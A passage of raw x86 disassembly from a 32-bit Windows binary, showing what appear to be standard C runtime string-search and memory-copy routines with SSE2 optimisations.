  40b29e:	83 c6 04             	add    $0x4,%esi
  40b2a1:	83 e9 01             	sub    $0x1,%ecx
  40b2a4:	75 f1                	jne    0x40b297
  40b2a6:	8b c8                	mov    %eax,%ecx
  40b2a8:	83 e1 03             	and    $0x3,%ecx
  40b2ab:	74 13                	je     0x40b2c0
  40b2ad:	8a 06                	mov    (%esi),%al
  40b2af:	88 07                	mov    %al,(%edi)
  40b2b1:	46                   	inc    %esi
  40b2b2:	47                   	inc    %edi
  40b2b3:	49                   	dec    %ecx
  40b2b4:	75 f7                	jne    0x40b2ad
  40b2b6:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40b2bd:	8d 49 00             	lea    0x0(%ecx),%ecx
  40b2c0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b2c4:	5e                   	pop    %esi
  40b2c5:	5f                   	pop    %edi
  40b2c6:	c3                   	ret
  40b2c7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40b2ce:	8b ff                	mov    %edi,%edi
  40b2d0:	ba 10 00 00 00       	mov    $0x10,%edx
  40b2d5:	2b d0                	sub    %eax,%edx
  40b2d7:	2b ca                	sub    %edx,%ecx
  40b2d9:	51                   	push   %ecx
  40b2da:	8b c2                	mov    %edx,%eax
  40b2dc:	8b c8                	mov    %eax,%ecx
  40b2de:	83 e1 03             	and    $0x3,%ecx
  40b2e1:	74 09                	je     0x40b2ec
  40b2e3:	8a 16                	mov    (%esi),%dl
  40b2e5:	88 17                	mov    %dl,(%edi)
  40b2e7:	46                   	inc    %esi
  40b2e8:	47                   	inc    %edi
  40b2e9:	49                   	dec    %ecx
  40b2ea:	75 f7                	jne    0x40b2e3
  40b2ec:	c1 e8 02             	shr    $0x2,%eax
  40b2ef:	74 0d                	je     0x40b2fe
  40b2f1:	8b 16                	mov    (%esi),%edx
  40b2f3:	89 17                	mov    %edx,(%edi)
  40b2f5:	8d 76 04             	lea    0x4(%esi),%esi
  40b2f8:	8d 7f 04             	lea    0x4(%edi),%edi
  40b2fb:	48                   	dec    %eax
  40b2fc:	75 f3                	jne    0x40b2f1
  40b2fe:	59                   	pop    %ecx
  40b2ff:	e9 e9 fe ff ff       	jmp    0x40b1ed
  40b304:	cc                   	int3
  40b305:	cc                   	int3
  40b306:	cc                   	int3
  40b307:	cc                   	int3
  40b308:	cc                   	int3
  40b309:	cc                   	int3
  40b30a:	cc                   	int3
  40b30b:	cc                   	int3
  40b30c:	cc                   	int3
  40b30d:	cc                   	int3
  40b30e:	cc                   	int3
  40b30f:	cc                   	int3
  40b310:	83 3d dc 3a 41 00 01 	cmpl   $0x1,0x413adc
  40b317:	72 5f                	jb     0x40b378
  40b319:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  40b31e:	8b d0                	mov    %eax,%edx
  40b320:	c1 e0 08             	shl    $0x8,%eax
  40b323:	0b d0                	or     %eax,%edx
  40b325:	66 0f 6e da          	movd   %edx,%xmm3
  40b329:	f2 0f 70 db 00       	pshuflw $0x0,%xmm3,%xmm3
  40b32e:	0f 16 db             	movlhps %xmm3,%xmm3
  40b331:	8b 54 24 04          	mov    0x4(%esp),%edx
  40b335:	b9 0f 00 00 00       	mov    $0xf,%ecx
  40b33a:	83 c8 ff             	or     $0xffffffff,%eax
  40b33d:	23 ca                	and    %edx,%ecx
  40b33f:	d3 e0                	shl    %cl,%eax
  40b341:	2b d1                	sub    %ecx,%edx
  40b343:	f3 0f 6f 0a          	movdqu (%edx),%xmm1
  40b347:	66 0f ef d2          	pxor   %xmm2,%xmm2
  40b34b:	66 0f 74 d1          	pcmpeqb %xmm1,%xmm2
  40b34f:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
  40b353:	66 0f eb d1          	por    %xmm1,%xmm2
  40b357:	66 0f d7 ca          	pmovmskb %xmm2,%ecx
  40b35b:	23 c8                	and    %eax,%ecx
  40b35d:	75 08                	jne    0x40b367
  40b35f:	83 c8 ff             	or     $0xffffffff,%eax
  40b362:	83 c2 10             	add    $0x10,%edx
  40b365:	eb dc                	jmp    0x40b343
  40b367:	0f bc c1             	bsf    %ecx,%eax
  40b36a:	03 c2                	add    %edx,%eax
  40b36c:	66 0f 7e da          	movd   %xmm3,%edx
  40b370:	33 c9                	xor    %ecx,%ecx
  40b372:	3a 10                	cmp    (%eax),%dl
  40b374:	0f 45 c1             	cmovne %ecx,%eax
  40b377:	c3                   	ret
  40b378:	33 c0                	xor    %eax,%eax
  40b37a:	8a 44 24 08          	mov    0x8(%esp),%al
  40b37e:	53                   	push   %ebx
  40b37f:	8b d8                	mov    %eax,%ebx
  40b381:	c1 e0 08             	shl    $0x8,%eax
  40b384:	8b 54 24 08          	mov    0x8(%esp),%edx
  40b388:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40b38e:	74 15                	je     0x40b3a5
  40b390:	8a 0a                	mov    (%edx),%cl
  40b392:	83 c2 01             	add    $0x1,%edx
  40b395:	3a cb                	cmp    %bl,%cl
  40b397:	74 59                	je     0x40b3f2
  40b399:	84 c9                	test   %cl,%cl
  40b39b:	74 51                	je     0x40b3ee
  40b39d:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40b3a3:	75 eb                	jne    0x40b390
  40b3a5:	0b d8                	or     %eax,%ebx
  40b3a7:	57                   	push   %edi
  40b3a8:	8b c3                	mov    %ebx,%eax
  40b3aa:	c1 e3 10             	shl    $0x10,%ebx
  40b3ad:	56                   	push   %esi
  40b3ae:	0b d8                	or     %eax,%ebx
  40b3b0:	8b 0a                	mov    (%edx),%ecx
  40b3b2:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  40b3b7:	8b c1                	mov    %ecx,%eax
  40b3b9:	8b f7                	mov    %edi,%esi
  40b3bb:	33 cb                	xor    %ebx,%ecx
  40b3bd:	03 f0                	add    %eax,%esi
  40b3bf:	03 f9                	add    %ecx,%edi
  40b3c1:	83 f1 ff             	xor    $0xffffffff,%ecx
  40b3c4:	83 f0 ff             	xor    $0xffffffff,%eax
  40b3c7:	33 cf                	xor    %edi,%ecx
  40b3c9:	33 c6                	xor    %esi,%eax
  40b3cb:	83 c2 04             	add    $0x4,%edx
  40b3ce:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  40b3d4:	75 21                	jne    0x40b3f7
  40b3d6:	25 00 01 01 81       	and    $0x81010100,%eax
  40b3db:	74 d3                	je     0x40b3b0
  40b3dd:	25 00 01 01 01       	and    $0x1010100,%eax
  40b3e2:	75 08                	jne    0x40b3ec
  40b3e4:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  40b3ea:	75 c4                	jne    0x40b3b0
  40b3ec:	5e                   	pop    %esi
  40b3ed:	5f                   	pop    %edi
  40b3ee:	5b                   	pop    %ebx
  40b3ef:	33 c0                	xor    %eax,%eax
  40b3f1:	c3                   	ret
  40b3f2:	8d 42 ff             	lea    -0x1(%edx),%eax
  40b3f5:	5b                   	pop    %ebx
  40b3f6:	c3                   	ret
  40b3f7:	8b 42 fc             	mov    -0x4(%edx),%eax
  40b3fa:	3a c3                	cmp    %bl,%al
  40b3fc:	74 36                	je     0x40b434
  40b3fe:	84 c0                	test   %al,%al
  40b400:	74 ea                	je     0x40b3ec
  40b402:	3a e3                	cmp    %bl,%ah
  40b404:	74 27                	je     0x40b42d
  40b406:	84 e4                	test   %ah,%ah
  40b408:	74 e2                	je     0x40b3ec
  40b40a:	c1 e8 10             	shr    $0x10,%eax
  40b40d:	3a c3                	cmp    %bl,%al
  40b40f:	74 15                	je     0x40b426
  40b411:	84 c0                	test   %al,%al
  40b413:	74 d7                	je     0x40b3ec
  40b415:	3a e3                	cmp    %bl,%ah
  40b417:	74 06                	je     0x40b41f
  40b419:	84 e4                	test   %ah,%ah
  40b41b:	74 cf                	je     0x40b3ec
  40b41d:	eb 91                	jmp    0x40b3b0
  40b41f:	5e                   	pop    %esi
  40b420:	5f                   	pop    %edi
  40b421:	8d 42 ff             	lea    -0x1(%edx),%eax
  40b424:	5b                   	pop    %ebx
  40b425:	c3                   	ret
  40b426:	8d 42 fe             	lea    -0x2(%edx),%eax
  40b429:	5e                   	pop    %esi
  40b42a:	5f                   	pop    %edi
  40b42b:	5b                   	pop    %ebx
  40b42c:	c3                   	ret
  40b42d:	8d 42 fd             	lea    -0x3(%edx),%eax
  40b430:	5e                   	pop    %esi
  40b431:	5f                   	pop    %edi
  40b432:	5b                   	pop    %ebx
  40b433:	c3                   	ret
  40b434:	8d 42 fc             	lea    -0x4(%edx),%eax
  40b437:	5e                   	pop    %esi
  40b438:	5f                   	pop    %edi
  40b439:	5b                   	pop    %ebx
  40b43a:	c3                   	ret
  40b43b:	cc                   	int3
  40b43c:	cc                   	int3
  40b43d:	cc                   	int3
  40b43e:	cc                   	int3
  40b43f:	cc                   	int3
  40b440:	57                   	push   %edi
  40b441:	56                   	push   %esi
  40b442:	8b 74 24 10          	mov    0x10(%esp),%esi
  40b446:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40b44a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40b44e:	8b c1                	mov    %ecx,%eax
  40b450:	8b d1                	mov    %ecx,%edx
  40b452:	03 c6                	add    %esi,%eax
  40b454:	3b fe                	cmp    %esi,%edi
  40b456:	76 08                	jbe    0x40b460
  40b458:	3b f8                	cmp    %eax,%edi
  40b45a:	0f 82 94 02 00 00    	jb     0x40b6f4
  40b460:	83 f9 20             	cmp    $0x20,%ecx
  40b463:	0f 82 d2 04 00 00    	jb     0x40b93b
  40b469:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40b46f:	73 13                	jae    0x40b484
  40b471:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  40b478:	01 
  40b479:	0f 82 8e 04 00 00    	jb     0x40b90d
  40b47f:	e9 e3 01 00 00       	jmp    0x40b667
  40b484:	0f ba 25 e0 3a 41 00 	btl    $0x1,0x413ae0
  40b48b:	01 
  40b48c:	73 09                	jae    0x40b497
  40b48e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40b490:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b494:	5e                   	pop    %esi
  40b495:	5f                   	pop    %edi
  40b496:	c3                   	ret
  40b497:	8b c7                	mov    %edi,%eax
  40b499:	33 c6                	xor    %esi,%eax
  40b49b:	a9 0f 00 00 00       	test   $0xf,%eax
  40b4a0:	75 0e                	jne    0x40b4b0
  40b4a2:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  40b4a9:	01 
  40b4aa:	0f 82 e0 03 00 00    	jb     0x40b890
  40b4b0:	0f ba 25 e0 3a 41 00 	btl    $0x0,0x413ae0
  40b4b7:	00 
  40b4b8:	0f 83 a9 01 00 00    	jae    0x40b667
  40b4be:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40b4c4:	0f 85 9d 01 00 00    	jne    0x40b667
  40b4ca:	f7 c6 03 00 00 00    	test   $0x3,%esi
  40b4d0:	0f 85 ac 01 00 00    	jne    0x40b682
  40b4d6:	0f ba e7 02          	bt     $0x2,%edi
  40b4da:	73 0d                	jae    0x40b4e9
  40b4dc:	8b 06                	mov    (%esi),%eax
  40b4de:	83 e9 04             	sub    $0x4,%ecx
  40b4e1:	8d 76 04             	lea    0x4(%esi),%esi
  40b4e4:	89 07                	mov    %eax,(%edi)
  40b4e6:	8d 7f 04             	lea    0x4(%edi),%edi
  40b4e9:	0f ba e7 03          	bt     $0x3,%edi
  40b4ed:	73 11                	jae    0x40b500
  40b4ef:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  40b4f3:	83 e9 08             	sub    $0x8,%ecx
  40b4f6:	8d 76 08             	lea    0x8(%esi),%esi
  40b4f9:	66 0f d6 0f          	movq   %xmm1,(%edi)
  40b4fd:	8d 7f 08             	lea    0x8(%edi),%edi
  40b500:	f7 c6 07 00 00 00    	test   $0x7,%esi
  40b506:	74 65                	je     0x40b56d
  40b508:	0f ba e6 03          	bt     $0x3,%esi
  40b50c:	0f 83 b4 00 00 00    	jae    0x40b5c6
  40b512:	66 0f 6f 4e f4       	movdqa -0xc(%esi),%xmm1
  40b517:	8d 76 f4             	lea    -0xc(%esi),%esi
  40b51a:	8b ff                	mov    %edi,%edi
  40b51c:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  40b521:	83 e9 30             	sub    $0x30,%ecx
  40b524:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40b529:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  40b52e:	8d 76 30             	lea    0x30(%esi),%esi
  40b531:	83 f9 30             	cmp    $0x30,%ecx
  40b534:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40b538:	66 0f 3a 0f d9 0c    	palignr $0xc,%xmm1,%xmm3
  40b53e:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  40b542:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40b546:	66 0f 3a 0f c2 0c    	palignr $0xc,%xmm2,%xmm0
  40b54c:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40b551:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  40b555:	66 0f 3a 0f ec 0c    	palignr $0xc,%xmm4,%xmm5
  40b55b:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  40b560:	8d 7f 30             	lea    0x30(%edi),%edi
  40b563:	7d b7                	jge    0x40b51c
  40b565:	8d 76 0c             	lea    0xc(%esi),%esi
  40b568:	e9 af 00 00 00       	jmp    0x40b61c
  40b56d:	66 0f 6f 4e f8       	movdqa -0x8(%esi),%xmm1
  40b572:	8d 76 f8             	lea    -0x8(%esi),%esi
  40b575:	8d 49 00             	lea    0x0(%ecx),%ecx
  40b578:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  40b57d:	83 e9 30             	sub    $0x30,%ecx
  40b580:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40b585:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  40b58a:	8d 76 30             	lea    0x30(%esi),%esi
  40b58d:	83 f9 30             	cmp    $0x30,%ecx
  40b590:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40b594:	66 0f 3a 0f d9 08    	palignr $0x8,%xmm1,%xmm3
  40b59a:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  40b59e:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40b5a2:	66 0f 3a 0f c2 08    	palignr $0x8,%xmm2,%xmm0
  40b5a8:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40b5ad:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  40b5b1:	66 0f 3a 0f ec 08    	palignr $0x8,%xmm4,%xmm5
  40b5b7:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  40b5bc:	8d 7f 30             	lea    0x30(%edi),%edi
  40b5bf:	7d b7                	jge    0x40b578
  40b5c1:	8d 76 08             	lea    0x8(%esi),%esi
  40b5c4:	eb 56                	jmp    0x40b61c
  40b5c6:	66 0f 6f 4e fc       	movdqa -0x4(%esi),%xmm1
  40b5cb:	8d 76 fc             	lea    -0x4(%esi),%esi
  40b5ce:	8b ff                	mov    %edi,%edi
  40b5d0:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  40b5d5:	83 e9 30             	sub    $0x30,%ecx
  40b5d8:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40b5dd:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  40b5e2:	8d 76 30             	lea    0x30(%esi),%esi
  40b5e5:	83 f9 30             	cmp    $0x30,%ecx
  40b5e8:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40b5ec:	66 0f 3a 0f d9 04    	palignr $0x4,%xmm1,%xmm3
  40b5f2:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  40b5f6:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40b5fa:	66 0f 3a 0f c2 04    	palignr $0x4,%xmm2,%xmm0
  40b600:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40b605:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  40b609:	66 0f 3a 0f ec 04    	palignr $0x4,%xmm4,%xmm5
  40b60f:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  40b614:	8d 7f 30             	lea    0x30(%edi),%edi
  40b617:	7d b7                	jge    0x40b5d0
  40b619:	8d 76 04             	lea    0x4(%esi),%esi
  40b61c:	83 f9 10             	cmp    $0x10,%ecx
  40b61f:	7c 13                	jl     0x40b634
  40b621:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
  40b625:	83 e9 10             	sub    $0x10,%ecx
  40b628:	8d 76 10             	lea    0x10(%esi),%esi
  40b62b:	66 0f 7f 0f          	movdqa %xmm1,(%edi)
  40b62f:	8d 7f 10             	lea    0x10(%edi),%edi
  40b632:	eb e8                	jmp    0x40b61c
  40b634:	0f ba e1 02          	bt     $0x2,%ecx
  40b638:	73 0d                	jae    0x40b647
  40b63a:	8b 06                	mov    (%esi),%eax
  40b63c:	83 e9 04             	sub    $0x4,%ecx
  40b63f:	8d 76 04             	lea    0x4(%esi),%esi
  40b642:	89 07                	mov    %eax,(%edi)
  40b644:	8d 7f 04             	lea    0x4(%edi),%edi
  40b647:	0f ba e1 03          	bt     $0x3,%ecx
  40b64b:	73 11                	jae    0x40b65e
  40b64d:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  40b651:	83 e9 08             	sub    $0x8,%ecx
  40b654:	8d 76 08             	lea    0x8(%esi),%esi
  40b657:	66 0f d6 0f          	movq   %xmm1,(%edi)
  40b65b:	8d 7f 08             	lea    0x8(%edi),%edi
  40b65e:	8b 04 8d a4 b6 40 00 	mov    0x40b6a4(,%ecx,4),%eax
  40b665:	ff e0                	jmp    *%eax
  40b667:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40b66d:	74 13                	je     0x40b682
  40b66f:	8a 06                	mov    (%esi),%al
  40b671:	88 07                	mov    %al,(%edi)
  40b673:	49                   	dec    %ecx
  40b674:	83 c6 01             	add    $0x1,%esi
  40b677:	83 c7 01             	add    $0x1,%edi
  40b67a:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40b680:	75 ed                	jne    0x40b66f
  40b682:	8b d1                	mov    %ecx,%edx
  40b684:	83 f9 20             	cmp    $0x20,%ecx
  40b687:	0f 82 ae 02 00 00    	jb     0x40b93b
  40b68d:	c1 e9 02             	shr    $0x2,%ecx
  40b690:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b692:	83 e2 03             	and    $0x3,%edx
  40b695:	ff 24 95 a4 b6 40 00 	jmp    *0x40b6a4(,%edx,4)
  40b69c:	ff 24 8d b4 b6 40 00 	jmp    *0x40b6b4(,%ecx,4)
  40b6a3:	90                   	nop
  40b6a4:	b4 b6                	mov    $0xb6,%ah
  40b6a6:	40                   	inc    %eax
  40b6a7:	00 bc b6 40 00 c8 b6 	add    %bh,-0x4937ffc0(%esi,%esi,4)
  40b6ae:	40                   	inc    %eax
  40b6af:	00 dc                	add    %bl,%ah
  40b6b1:	b6 40                	mov    $0x40,%dh
  40b6b3:	00 8b 44 24 0c 5e    	add    %cl,0x5e0c2444(%ebx)
  40b6b9:	5f                   	pop    %edi
  40b6ba:	c3                   	ret
  40b6bb:	90                   	nop
  40b6bc:	8a 06                	mov    (%esi),%al
  40b6be:	88 07                	mov    %al,(%edi)
  40b6c0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b6c4:	5e                   	pop    %esi
  40b6c5:	5f                   	pop    %edi
  40b6c6:	c3                   	ret
  40b6c7:	90                   	nop
  40b6c8:	8a 06                	mov    (%esi),%al
  40b6ca:	88 07                	mov    %al,(%edi)
  40b6cc:	8a 46 01             	mov    0x1(%esi),%al
  40b6cf:	88 47 01             	mov    %al,0x1(%edi)
  40b6d2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b6d6:	5e                   	pop    %esi
  40b6d7:	5f                   	pop    %edi
  40b6d8:	c3                   	ret
  40b6d9:	8d 49 00             	lea    0x0(%ecx),%ecx
  40b6dc:	8a 06                	mov    (%esi),%al
  40b6de:	88 07                	mov    %al,(%edi)
  40b6e0:	8a 46 01             	mov    0x1(%esi),%al
  40b6e3:	88 47 01             	mov    %al,0x1(%edi)
  40b6e6:	8a 46 02             	mov    0x2(%esi),%al
  40b6e9:	88 47 02             	mov    %al,0x2(%edi)
  40b6ec:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b6f0:	5e                   	pop    %esi
  40b6f1:	5f                   	pop    %edi
  40b6f2:	c3                   	ret
  40b6f3:	90                   	nop
  40b6f4:	8d 34 31             	lea    (%ecx,%esi,1),%esi
  40b6f7:	8d 3c 39             	lea    (%ecx,%edi,1),%edi
  40b6fa:	83 f9 20             	cmp    $0x20,%ecx
  40b6fd:	0f 82 51 01 00 00    	jb     0x40b854
  40b703:	0f ba 25 10 30 41 00 	btl    $0x1,0x413010
  40b70a:	01 
  40b70b:	0f 82 94 00 00 00    	jb     0x40b7a5
  40b711:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40b717:	74 14                	je     0x40b72d
  40b719:	8b d7                	mov    %edi,%edx
  40b71b:	83 e2 03             	and    $0x3,%edx
  40b71e:	2b ca                	sub    %edx,%ecx
  40b720:	8a 46 ff             	mov    -0x1(%esi),%al
  40b723:	88 47 ff             	mov    %al,-0x1(%edi)
  40b726:	4e                   	dec    %esi
  40b727:	4f                   	dec    %edi
  40b728:	83 ea 01             	sub    $0x1,%edx
  40b72b:	75 f3                	jne    0x40b720
  40b72d:	83 f9 20             	cmp    $0x20,%ecx
  40b730:	0f 82 1e 01 00 00    	jb     0x40b854
  40b736:	8b d1                	mov    %ecx,%edx
  40b738:	c1 e9 02             	shr    $0x2,%ecx
  40b73b:	83 e2 03             	and    $0x3,%edx
  40b73e:	83 ee 04             	sub    $0x4,%esi
  40b741:	83 ef 04             	sub    $0x4,%edi
  40b744:	fd                   	std
  40b745:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b747:	fc                   	cld
  40b748:	ff 24 95 50 b7 40 00 	jmp    *0x40b750(,%edx,4)
  40b74f:	90                   	nop
  40b750:	60                   	pusha
  40b751:	b7 40                	mov    $0x40,%bh
  40b753:	00 68 b7             	add    %ch,-0x49(%eax)
  40b756:	40                   	inc    %eax
  40b757:	00 78 b7             	add    %bh,-0x49(%eax)
  40b75a:	40                   	inc    %eax
  40b75b:	00 8c b7 40 00 8b 44 	add    %cl,0x448b0040(%edi,%esi,4)
  40b762:	24 0c                	and    $0xc,%al
  40b764:	5e                   	pop    %esi
  40b765:	5f                   	pop    %edi
  40b766:	c3                   	ret
  40b767:	90                   	nop
  40b768:	8a 46 03             	mov    0x3(%esi),%al
  40b76b:	88 47 03             	mov    %al,0x3(%edi)
  40b76e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b772:	5e                   	pop    %esi
  40b773:	5f                   	pop    %edi
  40b774:	c3                   	ret
  40b775:	8d 49 00             	lea    0x0(%ecx),%ecx
  40b778:	8a 46 03             	mov    0x3(%esi),%al
  40b77b:	88 47 03             	mov    %al,0x3(%edi)
  40b77e:	8a 46 02             	mov    0x2(%esi),%al
  40b781:	88 47 02             	mov    %al,0x2(%edi)
  40b784:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b788:	5e                   	pop    %esi
  40b789:	5f                   	pop    %edi
  40b78a:	c3                   	ret
  40b78b:	90                   	nop
  40b78c:	8a 46 03             	mov    0x3(%esi),%al
  40b78f:	88 47 03             	mov    %al,0x3(%edi)
  40b792:	8a 46 02             	mov    0x2(%esi),%al
  40b795:	88 47 02             	mov    %al,0x2(%edi)
  40b798:	8a 46 01             	mov    0x1(%esi),%al
  40b79b:	88 47 01             	mov    %al,0x1(%edi)
  40b79e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b7a2:	5e                   	pop    %esi
  40b7a3:	5f                   	pop    %edi
  40b7a4:	c3                   	ret
  40b7a5:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40b7ab:	74 0f                	je     0x40b7bc
  40b7ad:	49                   	dec    %ecx
  40b7ae:	4e                   	dec    %esi
  40b7af:	4f                   	dec    %edi
  40b7b0:	8a 06                	mov    (%esi),%al
  40b7b2:	88 07                	mov    %al,(%edi)
  40b7b4:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40b7ba:	75 f1                	jne    0x40b7ad
  40b7bc:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40b7c2:	72 68                	jb     0x40b82c
  40b7c4:	81 ee 80 00 00 00    	sub    $0x80,%esi
  40b7ca:	81 ef 80 00 00 00    	sub    $0x80,%edi
  40b7d0:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  40b7d4:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  40b7d9:	f3 0f 6f 56 20       	movdqu 0x20(%esi),%xmm2
  40b7de:	f3 0f 6f 5e 30       	movdqu 0x30(%esi),%xmm3
  40b7e3:	f3 0f 6f 66 40       	movdqu 0x40(%esi),%xmm4
  40b7e8:	f3 0f 6f 6e 50       	movdqu 0x50(%esi),%xmm5
  40b7ed:	f3 0f 6f 76 60       	movdqu 0x60(%esi),%xmm6
  40b7f2:	f3 0f 6f 7e 70       	movdqu 0x70(%esi),%xmm7
  40b7f7:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40b7fb:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  40b800:	f3 0f 7f 57 20       	movdqu %xmm2,0x20(%edi)
  40b805:	f3 0f 7f 5f 30       	movdqu %xmm3,0x30(%edi)
  40b80a:	f3 0f 7f 67 40       	movdqu %xmm4,0x40(%edi)
  40b80f:	f3 0f 7f 6f 50       	movdqu %xmm5,0x50(%edi)
  40b814:	f3 0f 7f 77 60       	movdqu %xmm6,0x60(%edi)
  40b819:	f3 0f 7f 7f 70       	movdqu %xmm7,0x70(%edi)
  40b81e:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  40b824:	f7 c1 80 ff ff ff    	test   $0xffffff80,%ecx
  40b82a:	75 90                	jne    0x40b7bc
  40b82c:	83 f9 20             	cmp    $0x20,%ecx
  40b82f:	72 23                	jb     0x40b854
  40b831:	83 ee 20             	sub    $0x20,%esi
  40b834:	83 ef 20             	sub    $0x20,%edi
  40b837:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  40b83b:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  40b840:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40b844:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  40b849:	83 e9 20             	sub    $0x20,%ecx
  40b84c:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  40b852:	75 dd                	jne    0x40b831
  40b854:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  40b85a:	74 15                	je     0x40b871
  40b85c:	83 ef 04             	sub    $0x4,%edi
  40b85f:	83 ee 04             	sub    $0x4,%esi
  40b862:	8b 06                	mov    (%esi),%eax
  40b864:	89 07                	mov    %eax,(%edi)
  40b866:	83 e9 04             	sub    $0x4,%ecx
  40b869:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  40b86f:	75 eb                	jne    0x40b85c
  40b871:	85 c9                	test   %ecx,%ecx
  40b873:	74 0f                	je     0x40b884
  40b875:	83 ef 01             	sub    $0x1,%edi
  40b878:	83 ee 01             	sub    $0x1,%esi
  40b87b:	8a 06                	mov    (%esi),%al
  40b87d:	88 07                	mov    %al,(%edi)
  40b87f:	83 e9 01             	sub    $0x1,%ecx
  40b882:	75 f1                	jne    0x40b875
  40b884:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b888:	5e                   	pop    %esi
  40b889:	5f                   	pop    %edi
  40b88a:	c3                   	ret
  40b88b:	eb 03                	jmp    0x40b890
  40b88d:	cc                   	int3
  40b88e:	cc                   	int3
  40b88f:	cc                   	int3
  40b890:	8b c6                	mov    %esi,%eax
  40b892:	83 e0 0f             	and    $0xf,%eax
  40b895:	85 c0                	test   %eax,%eax
  40b897:	0f 85 e3 00 00 00    	jne    0x40b980
  40b89d:	8b d1                	mov    %ecx,%edx
  40b89f:	83 e1 7f             	and    $0x7f,%ecx
  40b8a2:	c1 ea 07             	shr    $0x7,%edx
  40b8a5:	74 66                	je     0x40b90d
  40b8a7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40b8ae:	8b ff                	mov    %edi,%edi
  40b8b0:	66 0f 6f 06          	movdqa (%esi),%xmm0
  40b8b4:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  40b8b9:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  40b8be:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  40b8c3:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  40b8c7:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  40b8cc:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  40b8d1:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  40b8d6:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  40b8db:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  40b8e0:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  40b8e5:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  40b8ea:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  40b8ef:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
